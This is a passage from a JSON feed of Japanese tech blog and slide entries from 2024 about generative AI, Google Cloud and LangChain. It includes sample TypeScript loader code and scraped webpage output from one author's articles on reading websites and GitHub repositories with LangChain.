リスク評価や不正検知まとめベクトルインデックスは、生成AIの性能を飛躍的に向上させるための重要な技術です。様々な分野での応用が期待されており、今後もその重要性はますます高まっていくでしょう。さらに詳しく知りたい場合は、以下のキーワードで検索してみてください。ベクトルデータベースベクトル検索自然言語処理機械学習ニューラルネットワーク何か他に聞きたいことがあれば、お気軽にご質問ください。より具体的な質問の例:特定のベクトルデータベースについて詳しく知りたいベクトルインデックスを構築する際の注意点ベクトルインデックスを生成AIの開発にどのように活用できるかこれらの質問に対して、より詳細な情報を提供できます。","isoDate":"2024-09-06T14:48:50.000Z","dateMiliSeconds":1725634130000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run GPU + Ollama gemma2 のパフォーマンスを図ってみる","link":"https://zenn.dev/satohjohn/articles/912b4c718a8d74","contentSnippet":"概要Google Cloud 上で申請することで、Cloud Run GPU が使えるようになったので実行してみます。https://cloud.google.com/run/docs/configuring/services/gpu?hl=ja申請フォームGoogle Cloud では以下のように、サンプルが載っているので一旦それの通りの沿って、Gemma2 を起動するアプリケーションを作成します。https://cloud.google.com/run/docs/tutorials/gpu-gemma2-with-ollama?hl=jaとはいえ、それだけだとそのまま...","isoDate":"2024-09-06T08:31:03.000Z","dateMiliSeconds":1725611463000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Scala アプリケーションのビルドを改善してデプロイ時間を 1/4 にした話 | How I improved the build of my Scala application and reduced deployment time by 4x","link":"https://speakerdeck.com/nomadblacky/scala-ahurikesiyonnohirutowogai-shan-sitetehuroishi-jian-wo-1-4-nisitahua-how-i-improved-the-build-of-my-scala-application-and-reduced-deployment-time-by-4x","contentSnippet":"2024/09/06 Scalaわいわい勉強会 #3\\rhttps://scala-tokyo.connpass.com/event/325327/","isoDate":"2024-09-06T04:00:00.000Z","dateMiliSeconds":1725595200000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"2024年版 運用者たちのLLM","link":"https://speakerdeck.com/nwiizo/2024nian-ban-yun-yong-zhe-tatinollm","contentSnippet":"Cloud Operator Days 2024 クロージングイベント\\rhttps://cloudopsdays.com/closing/\\r\\rとても、端的に言うと「プロンプトエンジニアリングをしよう」って話。\\rこの発表資料は、LLM（大規模言語モデル）によるIT運用の可能性と課題を探っています。AIOpsの概念を基に、LLMがインシデント対応、ドキュメンテーション、コード分析などの運用タスクをどのように改善できるかを説明しています。同時に、LLMの「幻覚」や不完全性といった課題も指摘し、適切な利用方法やプロンプトエンジニアリングの重要性を強調しています。\\r\\r登壇時ブログ\\rhttps://syu-m-5151.hatenablog.com/entry/2024/09/06/154607","isoDate":"2024-09-06T04:00:00.000Z","dateMiliSeconds":1725595200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Google Cloud Gemini向けの生成AIのプロンプトエンジニアリング","link":"https://shu-kob.hateblo.jp/entry/2024/09/05/235035","contentSnippet":"cloud.google.com生成AIのプロンプトエンジニアリングは様々な手法がありますが、Gemini for Google Cloudなんて出ているのですね。Google Cloud のプロダクトとサービスに関しては、Geminiは学習済のようで、詳しいようです。読んで勉強したいと思います。","isoDate":"2024-09-05T14:50:35.000Z","dateMiliSeconds":1725547835000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Mini-Omni OSSでSpeech-to-Speechができるようになる？","link":"https://shu-kob.hateblo.jp/entry/2024/09/04/233919","contentSnippet":"arxiv.orgGPT-4oの進化系で、リアルタイム音声会話のできる生成AIがOSSで出たようです。github.comその名もMini-Omni。小型モデルでどうリアルタイム音声会話を実現したのか興味深いですね。生成AIでリアルタイム音声会話は難しく、Speech-to-Text-to-Speechという変換手順を踏む必要があり、時間がかかっていたところ、リアルタイム、つまりSpeech-to-Speechで早く処理できるようになった、ということですね。ぜひ論文を読んでみたいと思います。以下、AbstractをGeminiで訳してみました。（OpenAIちゃうんかいw）言語モデルの進歩とMini-Omni言語モデルの最近の進歩は、大きな成果を上げています。GPT-4oは新たなマイルストーンとして、人間とのリアルタイム会話が可能となり、人間に近い自然な流暢さを示しています。このような人間とコンピュータのインタラクションを実現するには、音声モダリティで直接推論を行い、ストリーミングで出力生成できるモデルが必要となります。しかし、これは現在の学術的なモデルではまだ実現できていません。これらのモデルは通常、音声合成のために追加のTTSシステムに依存しており、望ましくない遅延が生じます。本論文では、リアルタイム音声インタラクションが可能なオーディオベースのエンドツーエンド会話モデルであるMini-Omniを紹介します。この機能を実現するために、テキスト指示による音声生成方法と、推論時のバッチ並列戦略を提案しています。この手法は、元のモデルの言語能力を最小限の劣化で保持するのに役立ち、他の研究がリアルタイムインタラクション機能を確立できるようにします。このトレーニング方法を「Any Model Can Talk」と呼んでいます。また、音声出力を最適化したモデルをファインチューニングするためのVoiceAssistant-400Kデータセットも紹介します。私たちの知る限り、Mini-Omniはリアルタイム音声インタラクションのための最初の完全なエンドツーエンド、オープンソースモデルであり、今後の研究に貴重な可能性を提供します。","isoDate":"2024-09-04T14:39:19.000Z","dateMiliSeconds":1725460759000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloudの生成AIサンプルアプリEnterprise Knowledge Solution (EKS)","link":"https://shu-kob.hateblo.jp/entry/2024/09/03/235705","contentSnippet":"github.comGoogle Cloudの生成AIサンプルアプリ「Enterprise Knowledge Solution」 (EKS)がGitHubで公開されています。EKSはAmazon Elastic Kubernetes Serviceと紛らわしい（苦笑）「Enterprise Knowledge Solution」 はIAPとCloud RunベースでUI付きの生成AIアプリケーションをさっとデプロイできるようです。私はまだ試せていないですが、是非とも触ってみたいですね。terraformでデプロイできる模様。これは面白そう。コードも参考になりそうですね。","isoDate":"2024-09-03T14:57:05.000Z","dateMiliSeconds":1725375425000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChain Meetup Tokyo #2に登壇し、LangChainでWebサイトの内容取得やGitHubソースコード取得、というタイトルで発表しました","link":"https://shu-kob.hateblo.jp/entry/2024/09/02/224106","contentSnippet":"langchain.connpass.comLangChain Meetup Tokyo #2に登壇してきました。私は「LangChainでWebサイトの内容取得やGitHubソースコード取得」というタイトルで発表しました！次は @shu_kob によるLangChainでWebサイトの内容取得やGitHubソースコード取得\uD83D\uDC4F #LangChainJP pic.twitter.com/ryvFxqv6M1— こぎそ | Algomatic (@kgsi) 2024年9月2日   写真撮っていただけてました。ありがとうございます。ChatGPT/LangChainによるチャットシステム構築［実践］入門作者:吉田 真吾,大嶋 勇樹技術評論社Amazon「ChatGPT/LangChainによるチャットシステム構築［実践］入門」の著者、吉田 真吾さん、大嶋 勇樹さんにもお会いできました。お二人の会社、株式会社ジェネラティブエージェンツのCEO西見公宏さんにもお会いでき、コロッケそばさん、技術者としてステキ‼️ #langchainjp pic.twitter.com/N1GE4ArjJ0— \uD835\uDE4E\uD835\uDE5D\uD835\uDE5E\uD835\uDE63\uD835\uDE5C\uD835\uDE64 吉田真吾 (@yoshidashingo) 2024年9月2日   65歳で登壇されたコロッケそばさんかっこよかったです！ speakerdeck.com↑私の資料はこちらにアップロードしています。様々な学びがあり、もっと生成AIを頑張ろう、と思えた刺激的なMeetupでした！","isoDate":"2024-09-02T13:41:06.000Z","dateMiliSeconds":1725284466000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChainでWebサイトの内容取得やGitHubソースコード取得","link":"https://speakerdeck.com/shukob/langchaindewebsaitononei-rong-qu-de-yagithubsosukodoqu-de","contentSnippet":"https://langchain.connpass.com/event/329185/\\r\\rLangChainでは、Webサイトの内容取得やGitHubソースコード取得もできます。\\r使用してみた所感も交えてこれらの機能のご紹介をします。","isoDate":"2024-09-02T04:00:00.000Z","dateMiliSeconds":1725249600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Project IDX での Web アプリケーション開発","link":"https://zenn.dev/satohjohn/articles/4e7a1e5e3140e1","contentSnippet":"概要Project IDX (以下 IDX) は Google Cloud の Cloud Workstations をベースに Google がホストする仮想実装環境を提供してくれるサービスになります。https://idx.dev/PWA 対応しているため、install して利用することが可能です。（私は、 https://open-vsx.org/extension/k--kato/intellij-idea-keybindings こちらの extensions を利用しているため keybind を考えると install したほうが扱いやすいというのがあります)...","isoDate":"2024-09-02T03:41:10.000Z","dateMiliSeconds":1725248470000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"LangChainでgithubリポジトリのソースコードを読む方法","link":"https://shu-kob.hateblo.jp/entry/2024/09/01/235529","contentSnippet":"shu-kob.hateblo.jp昨日の記事に関連して、今回はLangChainでgithubリポジトリのソースコードを読む方法です。github.com↑サンプルソースコードを載せています。js.langchain.com↑使い方はこちら実行例npx ts-node githubLoader.ts https://github.com/shu-kob/langchain-sample-codeDocument {  pageContent: \\"import { CheerioWebBaseLoader } from \'@langchain/community/document_loaders/web/cheerio\'\\\\n\\" +    \\"import { RecursiveCharacterTextSplitter } from \'@langchain/textsplitters\'\\\\n\\" +    \\"import { HtmlToTextTransformer } from \'@langchain/community/document_transformers/html_to_text\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function webLoad (url: string) {\\\\n\' +    \'  const loader = new CheerioWebBaseLoader(url)\\\\n\' +    \'  const docs = await loader.load()\\\\n\' +    \\"  const splitter = RecursiveCharacterTextSplitter.fromLanguage(\'html\')\\\\n\\" +    \'  const transformer = new HtmlToTextTransformer()\\\\n\' +    \'  const sequence = splitter.pipe(transformer)\\\\n\' +    \'  const newDocuments = await sequence.invoke(docs)\\\\n\' +    \\"  console.log(\'newDocuments:\')\\\\n\\" +    \'  console.log(newDocuments)\\\\n\' +    \'}\\\\n\' +    \'\\\\n\' +    \'webLoad(url)\\\\n\',  metadata: {    source: \'cheerioWebBaseLoader.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}Document {  pageContent: \\"import { GithubRepoLoader } from \'@langchain/community/document_loaders/web/github\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function readSorceCodesFromGithub(url: string) {\\\\n\' +    \'\\\\n\' +    \'  const loader = new GithubRepoLoader(\\\\n\' +    \'    url,\\\\n\' +    \'    {\\\\n\' +    \'      branch: \\"main\\", // Defaultブランチが \\"master\\" でないか注意。他のブランチも選択可能\\\\n\' +    \'      recursive: true,\\\\n\' +    \'      processSubmodules: true,\\\\n\' +    \'      unknown: \\"warn\\",\\\\n\' +    \'      maxConcurrency: 5, // Defaults to 2\\\\n\' +    \'      ignorePaths: [\\"*.json\\", \\"*.yaml\\", \\"*.yml\\", \\"*config*\\", \\"*.md\\", \\"Dockerfile\\", \\"*ignore\\", \\".eslintrc.js\\", \\"*.svg\\"] // 除外するファイルパス\\\\n\' +    \'    }\\\\n\' +    \'  );\\\\n\' +    \'\\\\n\' +    \'  for await (const doc of loader.loadAsStream()) {\\\\n\' +    \'    console.log(doc)\\\\n\' +    \'  }\\\\n\' +    \'};\\\\n\' +    \'\\\\n\' +    \'readSorceCodesFromGithub(url)\\\\n\',  metadata: {    source: \'githubLoader.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}Document {  pageContent: \\"import * as cheerio from \'cheerio\'\\\\n\\" +    \'\\\\n\' +    \'const url = process.argv[2]\\\\n\' +    \'\\\\n\' +    \'async function webLoad (url: string) {\\\\n\' +    \'  // HTMLの取得\\\\n\' +    \'  const response = await fetch(url)\\\\n\' +    \'  const htmlText = await response.text()\\\\n\' +    \'  const cheerioText = cheerio.load(htmlText)\\\\n\' +    \'\\\\n\' +    \'  // styleとscriptを除去\\\\n\' +    \\"  cheerioText(\'style\').remove()\\\\n\\" +    \\"  cheerioText(\'script\').remove()\\\\n\\" +    \'\\\\n\' +    \\"  const bodyContent: string = cheerioText(\'body\').text().replace(/\\\\\\\\s+/g, \'\')\\\\n\\" +    \'\\\\n\' +    \\"  console.log(\'bodyContent:\')\\\\n\\" +    \'  console.log(bodyContent)\\\\n\' +    \'  return bodyContent\\\\n\' +    \'}\\\\n\' +    \'\\\\n\' +    \'webLoad(url)\\\\n\',  metadata: {    source: \'webLoad.ts\',    repository: \'https://github.com/shu-kob/langchain-sample-code\',    branch: \'main\'  },  id: undefined}これらのソースコードをプロンプトに含めて、生成AIに投げます。例えば、GitHubリポジトリの仕様を聞くなどです。多くの場合、ソースコードの文量は多くなり、それなりのトークン数になるので、200万トークン対応のGemini-1.5などを使うのが良いでしょう。","isoDate":"2024-09-01T14:55:29.000Z","dateMiliSeconds":1725202529000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"LangChainでURLからWebページの中身を読み込む方法","link":"https://shu-kob.hateblo.jp/entry/2024/08/31/223416","contentSnippet":"langchain.connpass.com今度、Langchain Meetup Tokyoで喋るので、「LangChainでURLからWebページの中身を読み込む方法」を準備中github.com↑ソースコードを上げておきました。npx ts-node cheerioWebBaseLoader.ts https://shu-kob.hateblo.jp/entry/2024/08/29/234143という形で実行し、以下の結果が得られます。newDocuments:[  Document {    pageContent: \'Toilを無くして徒然なるままに日暮し硯に向かひたい 読者になる Toilを無くして徒然なるままに日暮し硯に向かひたい\\\\n\' +      \'生成AIアプリケーション開発などを行うエンジニアのブログです。 2024-08-29 オライリーのAWS生成AI本 AWSではじめる生成AI\\\\n\' +      \'―RAGアプリケーション開発から、基盤モデルの微調整、マルチモーダルAI活用までを試して学ぶ作者:Chris Fregly,Antje\\\\n\' +      \'Barth,Shelbee EigenbrodeオライリージャパンAmazon そういや、オライリージャパンからAWSの生成AI本出てますね。\\\\n\' +      \'欲しいと思いながらも買うてない。 現状、自身の仕事のほとんどはGoogle cloudなので、AWS書籍どうしようかと思ってますが、\\\\n\' +      \'面白そうなら買うてみるしか！ 翻訳はAWS Japanの久富木 隆一さん。 AWSの中の人が翻訳しているので確かでしょうね！ shu-kob\\\\n\' +      \'2024-08-29 23:41 読者になる\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'shu-kob 2024-08-29 23:41 読者になる 広告を非表示にする 関連記事 2024-08-04 日本生成AIユーザ会\\\\n\' +      \'Geminiマルチモーダルプログラミング（ハンズオン）を2024年8月13日(… genai-users.connpass.com\\\\n\' +      \'このブログで何回か書いておりますが… 2024-07-20 Google Gemini 1.5／LlamaIndex／LangChain\\\\n\' +      \'人工知能プログラミング… 2024年7月15日に Googleの生成AIモデル Gemini1.5 に対応した技…\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'1.5／LlamaIndex／LangChain 人工知能プログラミング… 2024年7月15日に Googleの生成AIモデル Gemini1.5\\\\n\' +      \'に対応した技… 2024-06-07 Google Cloud Vertex AI Agent Builderの使い方\\\\n\' +      \'RAG(Retrieval-Augmented Generation) RAG（Retrieval Augmente… 2024-04-05\\\\n\' +      \'生成AIアプリケーション開発入門ハンズオン genai-users.connpass.com この記事は、日本生成AIユーザ会 #1 … 2023-12-17\\\\n\' +      \'生成AIについて学んだのでざっとアウトプット はじめに 3-shake Advent Calendar 2023シリーズ1、17日目の記… もっと読む\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'生成AIについて学んだのでざっとアウトプット はじめに 3-shake Advent Calendar 2023シリーズ1、17日目の記… もっと読む\\\\n\' +      \'コメントを書く \xab SRETT#10 ~ 夏のSRE祭り！アーカイブ動画… 「SREをはじめよう」(Becoming SRE邦訳)が… \xbb プロフィール\\\\n\' +      \'id:shu-kob 読者です 読者をやめる 読者になる 読者になる このブログについて 検索 リンク はてなブログ ブログをはじめる\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'このブログについて 検索 リンク はてなブログ ブログをはじめる 週刊はてなブログ はてなブログPro 最新記事 SRETT#10 ~\\\\n\' +      \'夏のSRE祭り！アーカイブ動画公開！ オライリーのAWS生成AI本 「SREをはじめよう」(Becoming SRE邦訳)が出版 Google Cloud\\\\n\' +      \'エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'Google Cloud エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス\\\\n\' +      \'後継者不足のCOBOLを生成AIに引き継ぎ 月別アーカイブ ▼ ▶ 2024 2024 / 8 2024 / 7 2024 / 6 2024 / 5\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'2024 / 6 2024 / 5 2024 / 4 2024 / 3 2024 / 2 ▼ ▶ 2023 2023 / 12\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'2023 / 12 はてなブログをはじめよう！ shu-kobさんは、はてなブログを使っています。あなたもはてなブログをはじめてみませんか？\\\\n\' +      \'はてなブログをはじめる（無料） はてなブログとは Toilを無くして徒然なるままに日暮し硯に向かひたい Powered by Hatena Blog |\\\\n\' +      \\"ブログを報告する if (typeof window.Hatena === \'undefined\') { window.Hatena = {}; } if\\\\n\\" +      \\"(!Hatena.hasOwnProperty(\'Star\')) { Hatena.Star = { VERSION: 2, }; } (function(d,\\\\n\\" +      \'s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id))\\\\n\' +      \'return; js = d.createElement(s); js.id = id; js.src =\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  },  Document {    pageContent: \'VERSION: 2, }; } (function(d, s, id) { var js, fjs =\\\\n\' +      \'d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js =\\\\n\' +      \'d.createElement(s); js.id = id; js.src =\\\\n\' +      \'\\"//connect.facebook.net/ja_JP/sdk.js#xfbml=1&appId=719729204785177&version=v17.0\\";\\\\n\' +      \\"fjs.parentNode.insertBefore(js, fjs); }(document, \'script\', \'facebook-jssdk\'));\\\\n\\" +      \'引用をストックしました ストック一覧を見る 閉じる 引用するにはまずログインしてください ログイン 閉じる 引用をストックできませんでした。再度お試しください\\\\n\' +      \'閉じる 限定公開記事のため引用できません。\\\\n\' +      \'\\\\n\' +      \'読者です 読者をやめる 読者になる 読者になる Hatena.Diary.GlobalHeader.init()\',    metadata: {      source: \'https://shu-kob.hateblo.jp/entry/2024/08/29/234143\',      loc: [Object]    },    id: undefined  }]npx  ts-node cheerioWebBaseLoader.ts https://www.gyomusuper.jp/ただし、例えば業務スーパーのホームページを読んだ際、余計なコードが多い。newDocuments:[  Document {    pageContent: \\"$(function() { $(\'.sale_bnr_close\').on(\'click\', function() {\\\\n\\" +      \\"$(\'.sale_bnr\').css(\'display\', \'none\'); }); }); /*onlineshopメニュー*/ .menu_ec:hover\\\\n\\" +      \'{ background:url(\\"./img/menu_ec_on.png\\") no-repeat left center #FFF; transition:\\\\n\' +      \'all .5s; } /*Gyomucaメニュー*/ .menu_gyomuca { display: inline-block; width: 260px;\\\\n\' +      \'height: 44px; text-align: center; text-decoration: none; line-height: 44px;\\\\n\' +      \'outline: none; background:url(\\"./img/menu_gyomuca.png\\") no-repeat left center;\\\\n\' +      \'text-indent:100%; white-space:nowrap; overflow:hidden; } .menu_gyomuca:hover {\\\\n\' +      \'background:url(\\"./img/menu_gyomuca_on.png\\") no-repeat left center #FFF;\\\\n\' +      \'transition: all .5s; } /*ここまで*/ .menu_gyomuca_on\\\\n\' +      \'{background:url(\\"./img/menu_gyomuca_on.png\\") no-repeat left center\\\\n\' +      \'#FFF;text-indent:100%;white-space:nowrap;overflow:hidden;display:\\\\n\' +      \'inline-block;width: 260px;height: 44px;line-height: 44px;}\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'left center #FFF;text-indent:100%;white-space:nowrap;overflow:hidden;display:\\\\n\' +      \'inline-block;width: 260px;height: 44px;line-height: 44px;}\\\\n\' +      \'お問い合わせ　｜　会社案内　｜　サイトポリシー　｜　個人情報の保護に関する基本方針 ホーム 商品紹介 ミラクルレシピ 特集一覧 安心安全の取り組み\\\\n\' +      \'業務スーパーとは Gyomuca お問い合わせ オンラインショップ FC加盟店募集 会社案内 日本語 / ENGLISH / 中文 .fc_com_link {\\\\n\' +      \'display: flex; margin-left: 40px; margin-top: 5px; } #side_menu ul.fc_com_link\\\\n\' +      \'li { width: auto; height: auto; } #side_menu ul.fc_com_link li:nth-of-type(1) {\\\\n\' +      \'margin-right: 10px; } #side_menu ul.fc_com_link li a { position: relative;\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'height: auto; } #side_menu ul.fc_com_link li:nth-of-type(1) { margin-right:\\\\n\' +      \'10px; } #side_menu ul.fc_com_link li a { position: relative; font-size: 12px;\\\\n\' +      \'color: #fff; font-weight: bold; text-shadow: 0px 0px 0.1px #fff; letter-spacing:\\\\n\' +      \'1px; padding:5px; } #side_menu ul.fc_com_link li a span { content: \\"\\"; display:\\\\n\' +      \'inline-block; width: 0; height: 0; border-style: solid; border-width: 5px 0 5px\\\\n\' +      \'8.7px; border-color: transparent transparent transparent #ffffff; padding-right:\\\\n\' +      \'8px; } #side_menu ul.fc_com_link li a:hover { background-color: #fff; color:\\\\n\' +      \'#00a55a; text-decoration: none; transition: all .5s; } #side_menu ul.fc_com_link\\\\n\' +      \'li a:hover span { border-color: transparent transparent transparent\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'#00a55a; text-decoration: none; transition: all .5s; } #side_menu ul.fc_com_link\\\\n\' +      \'li a:hover span { border-color: transparent transparent transparent #00a55a;\\\\n\' +      \'transition: all .5s; } /*FCページの時*/ #side_menu ul.fc_com_link li a.menu_fc2_on {\\\\n\' +      \'background-color: #fff; color: #00a55a; text-decoration: none; text-shadow: 0px\\\\n\' +      \'0px 0.1px #00a55a; } #side_menu ul.fc_com_link li a.menu_fc2_on span {\\\\n\' +      \'border-color: transparent transparent transparent #00a55a; } /*ここまで*/ .lang_box\\\\n\' +      \'{ margin-left: 42px; display: flex; } .lang_box span:nth-child(n + 2) {\\\\n\' +      \'margin-left: 8px; } .social_box { margin-left: 38px; display: flex; margin-top:\\\\n\' +      \'20px; padding-left: 5px; } .social_box p img { width: 100%; } .social_box\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'{ margin-left: 38px; display: flex; margin-top: 20px; padding-left: 5px; }\\\\n\' +      \'.social_box p img { width: 100%; } .social_box p:nth-of-type(1) { margin-right:\\\\n\' +      \'18px; } .social_box p { width: 35px; } @media screen and (min-width: 1024px) {\\\\n\' +      \'#side_menu .social_box { padding-bottom: 80px; } } // 指定日時を超えたらセールスライド・バナー非表示\\\\n\' +      \\"var now = new Date(); var end = new Date(\'2024/10/31 23:59:59\');\\\\n\\" +      \\"//（指定日時　時間は24h表記） if ( now > end ) { $(\'.sale_slide_top\').remove();\\\\n\\" +      \\"$(\'.sale_bnr\').remove(); }else{ // 保持時間を設定 30分後を取得 var min = new Date();\\\\n\\" +      \'min.setTime( min.getTime() + ( 30 * 60 * 1000 )); console.log(min);\\\\n\' +      `$(\'.sale_bnr\').css(\'display\',\'block\'); $.cookie(\\"sale_bnr\\") ==`,    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'var min = new Date(); min.setTime( min.getTime() + ( 30 * 60 * 1000 ));\\\\n\' +      `console.log(min); $(\'.sale_bnr\').css(\'display\',\'block\'); $.cookie(\\"sale_bnr\\") ==\\\\n` +      `\'on\'?$(\'.sale_bnr\').hide():$(\'.sale_bnr\').show(); $.cookie(\\"sale_bnr\\",\'on\',{\\\\n` +      \\"expires: min , path: \'/\' }); } // 指定日時を超えたらセールスライド・バナー非表示 var now = new Date();\\\\n\\" +      \\"var end = new Date(\'2024/8/31 23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) {\\\\n\\" +      \\"$(\'.sale_bnr_img img\').attr(\'src\',\'img/main_sale20240901.png\'); }\\\\n\\" +      \\"$(window).on(\'load\', function(){ $(\'#bakudan\').attr(\'data-lightbox\',\'info01\');\\\\n\\" +      \'}); // 指定日時を超えたらセールスライド・バナー非表示 var now = new Date(); var end = new\\\\n\' +      \\"Date(\'2024/8/31 23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) {\\\\n\\" +      \\"$(\'.bakudan_slide\').remove(); $(\'.sale_alide\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"指定日時を超えたらセールスライド・バナー非表示 var now = new Date(); var end = new Date(\'2024/8/31\\\\n\\" +      \\"23:59:59\'); //（指定日時　時間は24h表記） if ( now > end ) { $(\'.bakudan_slide\').remove();\\\\n\\" +      \\"$(\'.sale_alide img\').attr(\'src\',\'img/main_sale20240901.png\'); } NEW ITEM 新着商品 新着\\\\n\\" +      \'ホット＆スパイシーヌードル\\\\n\' +      \'ホットでスパイシーなインスタントヌードルです。スパイスをきかせたスープは、ピリッとした辛さの中にも旨みがあり、クセになります！熱湯をかけて粉末スープと調味オイルを加えるだけの簡単調理も魅力。鍋で煮込んでお好みの具材や、ご飯を入るアレンジもおすすめです。5袋入り。\\\\n\' +      \'詳しくはこちら 詳しくはこちら PICK UP!おすすめ商品 商品をもっと見る 新着 パルメザンチーズのリゾット\\\\n\' +      \'イタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！\\\\n\' +      \'詳しくはこちら\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'パルメザンチーズのリゾット\\\\n\' +      \'イタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！\\\\n\' +      \'詳しくはこちら パルメザンチーズ[要冷蔵] 詳しくはこちら PICK UP!おすすめレシピ レシピをもっと見る SPECIAL TOPICS 特集\\\\n\' +      \'特集をもっと見る SNS 公式Instagram・公式X（旧Twitter） Tweets\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'Tweets by GyomusuperOFCL 公式Instagram 公式X（旧Twitter）\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'公式Instagram 公式X（旧Twitter）\\\\n\' +      \'2024年8月30日台風10号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風10号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風10号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月19日フジテレビ「めざましテレビ」で紹介されました2024年8月16日（金）放送のフジテレビ「めざましテレビ」で、業務スーパーの商品が紹介されました。放送局：フジテレビ番組名：「めざましテレビ」放送日：2024年8月16日（金）めざましテレビ2024年8月16日台風7号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風7号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風7号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月15日【セール情報】9月1日（日）から「お買い得まみれ!!総力祭\\\\n\' +      \'日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭\\\\n\' +      \'日頃のご愛顧感謝セール」を開催いたします。国内関連工場のオリジナル商品や海外直輸入商品など、とにかくお得なアイテム盛りだくさん！全国の業務スーパーで皆さまのご来店を心よりお待ちしております。<セール期間>【第1弾】2024年9月1日（日）～9月30日（月）【第2弾】2024年10月1日（火）～10月31日（木）<セール対象店舗>全国の業務スーパー各店（※一部店舗を除く）セール特設ページはこちら2024年8月12日台風5号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風5号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業時間や休業のご確認につきましては、台風5号の影響による営業に関するお知らせをご確認ください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。\\\\n\' +      \'一覧を見る 『世界の本物』を直輸入！\\\\n\' +      \'業務スーパーには、世界の国々で現地の人々に愛されている『世界の本物』が盛りだくさん！めずらしいものから日本でもなじみのあるものまで、厳選したアイテムを、高品質＆ロープライスで取りそろえています！\\\\n\' +      \'安さの秘密 